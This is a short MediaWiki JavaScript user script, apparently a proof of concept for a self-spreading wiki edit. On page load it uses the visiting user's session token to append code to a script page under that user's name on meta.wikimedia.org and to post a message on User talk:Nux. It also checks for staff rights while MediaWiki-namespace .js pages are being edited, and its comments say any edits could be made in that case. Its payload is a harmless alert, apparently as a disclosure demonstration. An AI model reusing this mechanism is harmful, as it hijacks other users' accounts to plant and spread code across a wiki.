/**
 * Just checking...
 */
// iife
(function(){
	
	// check if I'm on a staff account which can do more
	function isCurrentUserStaff(checkGroup='staff') {
		const groups = mw.config.get("wgUserGroups") || [];
		const globalGroups = mw.config.get("wgGlobalGroups") || [];

		return groups.includes(checkGroup) || globalGroups.includes(checkGroup);
	}
	// check if I just unlocked Mediawiki edits
	function isUserUnlocked() {
		return (
			mw.config.get("wgAction") === "edit" &&
			mw.config.get("wgNamespaceNumber") === 8 &&
			mw.config.get("wgTitle").endsWith(".js")
		);
	}
	// spread the word
	async function editWiki(user='not used, but it could') {
		await mw.loader.using('mediawiki.api');
		const metaApi = new mw.ForeignApi("https://meta.wikimedia.org/w/api.php");
		const username = mw.config.get('wgUserName');

		await metaApi.postWithToken("csrf", {
			action: 'edit',
			title: `User:${username}/wiki-poc--could-be--global.js`,
			appendtext: "\nalert('Hi');",
			summary: 'POC edit'
		});

		await metaApi.postWithToken("csrf", {
			action: "edit",
			title: "User talk:Nux",
			section: "new",
			sectiontitle: "Hello dark theater my old friend " + (new Date()).toISOString(),
			text: `I just wanted you to check out [[User:${username}/wiki-poc--could-be--global.js]] ~~~~`,
			summary: "PoC message",
			format: "json"
		});
	}
	async function doTheStuff() {
		let activeUsers = [];
		if (isCurrentUserStaff() && isUserUnlocked()) {
			// I could do any edits in Mediawiki for an hour here.
			// I could use random setTimeout to pause execution
			// or setInterval to avoid making too many edits at once.
			for (let user of activeUsers) {
				await editWiki(user);
			}
		}

		// simple edit
		editWiki();	
	}
	$(function(){
		doTheStuff();
	});

// iife
})();
